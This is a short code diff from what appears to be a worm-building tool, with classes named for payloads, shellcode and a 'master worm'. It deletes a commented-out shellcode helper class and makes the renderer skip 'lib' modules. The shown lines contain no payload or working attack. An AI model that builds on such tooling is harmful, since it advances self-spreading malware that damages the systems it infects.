@@ -11,26 +11,6 @@ from .tools.pay_builder import PayloadBuilder
 
 from .tools.coder_template_tools.master_tool import MasterTempTool
 
-# class TempTools:
-#     def __init__(self, coder: object):
-#         self.coder = coder
-#         self.generator = TT_MOD_Generator(self)
-    
-#     def var_len(self, variable: object) -> int:
-#         return len(variable)
-    
-#     def shellcode_len(self, variable: object) -> int:
-#         scode = variable.split(", ")
-#         return len(scode)
-    
-#     def generate_text(self, src_data: list) -> str:
-#         return self.generator.generate_text(src_data)
-    
-#     def build_asm_scvar(self, src_data: list, shellcode: str, var_name: str, table_name: str, arch: str = "x86") -> str:
-#         return self.generator.build_asm_var_shellcodex(src_data, shellcode, var_name, table_name, arch)
-    
-
-
 
 class Coder:
     def __init__(self, queen: object, worm_builder: object):
@@ -207,9 +187,13 @@ class Coder:
                 continue
             if mod.subTypes == "dll":
                 continue
+            elif mod.subTypes == "lib":
+                continue
             codes.append(self.render_single(mod, var))
         for smod in self.WB.raw_worm.support.values():
             if smod.subTypes == "dll":
+                continue
+            elif smod.subTypes == "lib":
                 continue
             codes.append(self.render_single(smod, var))
         codes.append(self.render_single(self.WB.raw_worm.master_worm, var))
